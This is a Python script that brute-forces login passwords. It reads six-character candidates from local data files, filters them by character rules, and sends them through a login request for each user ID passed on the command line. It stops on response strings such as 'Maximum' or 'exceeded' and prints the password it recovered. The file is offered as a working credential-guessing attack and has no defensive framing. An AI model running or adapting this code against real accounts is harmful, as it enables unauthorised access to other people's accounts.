from sys import argv
from sendrqst import send_request
from algo import check

listn = []
for i in range(0,10):
    listn.append(str(i))

def pwdsEx():
    data = open("pwd.dat","r").read()
    #file = open("pwd.dat","w")
    pwdx = []
    for i in range(0,len(data)/7):
        s=""
        #print "Reading for print " ,i
        for j in range(6):
            s=s+data[i*7 + j]
        #file.write(s+"\n")
        pwdx.append(s)
    #file.close()
    #print open("pwd.data","r").read()
    return pwdx

def pwds1():
    data = open("brt_pwd.dat","r").read()
    #file = open("pwd.dat","w")
    pwd = []
    for i in range(0,len(data)/7):
        s=""
        #print "Reading for print " ,
        for j in range(6):
            s=s+data[i*7 + j]
        #file.write(s+"\n")
        pwd.append(s)
    #file.close()
    #print open("pwd.data","r").read()
    return pwd



def bruteforce(id):
    pwd=pwds1()
    pwd1 = []
    count=0
    countt=0
    print (id,type(id))
    for i in pwd :
        count+=1 
        found = True
        if 'a' in i:
            found = False
        if 'z' in i:
            found = False
        if 'x' in i:
            found = False
        if 'b' in i:
            found = False
        if 'v' in i:
            found = False
        if 'c' in i:
            found = False
        if 'o' in i:
            found = False
        if '0' in i:
            found = False
        if 'n' in i:
            found = False
        if 'm' in i:
            found = False
        charInpwd = []
        num = False
        for x in i:
            if(x in listn):
                num = True
            if x not in charInpwd:
                charInpwd.append(x)
        if len(charInpwd)!=3:
            found = False       
        if count>0 and found and num and check(i):
            countt+=1
            #if __name__ == '__main__':
            print (count,countt)
            data = send_request('login',id,i)
            if "Maximum" in data:
                return i
            elif "exceeded" in data:
                return i
            elif "into" in data:
                return i
            elif "allowed" in data:
                return i
        elif num==False and check(i):
            pwd1.append(i)
    for i in pwd1:
        countt+=1
        count+=1
        #if __name__ == '__main__':
        print (count , countt , len(pwd1))
        data = send_request('login',id,i)
        if "Maximum" in data:
            return i
        elif "exceeded" in data:
            return i
        elif "into" in data:
            return i
        elif "allowed" in data:
            return i
    return "NO"

if __name__ == '__main__':
    ans = []
    if len(argv)>1:
        pwds= pwdsEx()
        j=1
        while j<len(argv):
            found = True
            for i in pwds:
                data = send_request('login',str(argv[j]),i)
                print(str(argv[j]),i)
                if "Maximum" in data:
                    ans.append(i)
                    found = True
                    break
                elif "exceeded" in data:
                    ans.append(i)
                    found = True
                    break
                elif "into" in data:
                    ans.append(i)
                    found = True
                    break
                elif "allowed" in data:
                    ans.append(i)
                    found = True
                    break
                else :
                    #print "Not Found"
                    found = False
            if found==False:
                ans.append(bruteforce(str(argv[j])))
            j+=1
    for i in range(1,len(argv)):
        print (argv[i] + " " + ans[i-1])
